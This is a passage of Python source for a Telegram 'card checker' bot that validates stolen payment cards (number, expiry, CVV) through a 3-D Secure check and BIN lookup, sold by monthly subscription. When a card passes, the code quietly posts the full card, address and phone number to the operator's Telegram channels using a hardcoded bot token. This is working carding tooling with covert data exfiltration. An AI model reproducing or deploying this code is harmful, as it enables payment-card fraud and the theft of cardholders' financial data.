1 𝗠𝗢𝗡𝗧𝗛 » 13$
━━━━━━━━━━━━

𝗖𝗟𝗜𝗖𝗞 /cmds 𝗧𝗢 𝗩𝗜𝗘𝗪 𝗧𝗛𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦

𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡 𝗡𝗢𝗪 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="𝗢𝗪𝗡𝗘𝗥 ", url="https://t.me/YourExDestiny")
		ahmed = types.InlineKeyboardButton(text="𝘾𝙃𝘼𝙉𝙉𝙀𝙇 ", url="https://t.me/CARD3DBOTx")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	ko = (bot.reply_to(message, "𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗖𝗔𝗥𝗗𝗦...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		last= str(vbv(cc))
		if 'result not found' in last:
			last='Authenticate Frictionless Failed'
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
	    level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>𝗣𝗔𝗦𝗦𝗘𝗗  ✅ 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @YourExDestiny
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @YourExDestiny
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
		acc =  '-1002222638488'
		mg = f"""<b> 
❆═══𝖦ʙᴘ 𝖲ᴄʀᴀᴘᴘᴇʀ�═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══𝙸𝙽𝙵𝙾═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ <code>{country} - {country_flag}</code>
❆═══𝖦ʙᴘ 𝖲ᴄʀᴀᴘᴘᴇʀ�═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @card3dbotx
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @YourExDestiny
</b>"""
		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7386696229:AAGc13dq5xX6eADECHkNQBC32q9d2xE72jA'
		acb =  '-1002046977369'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	id=call.from_user.id
	stopuser[f'{id}']['status'] = 'stop'

	
print("تم تشغيل البوت")
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(f"حدث خطأ: {e}")
"""
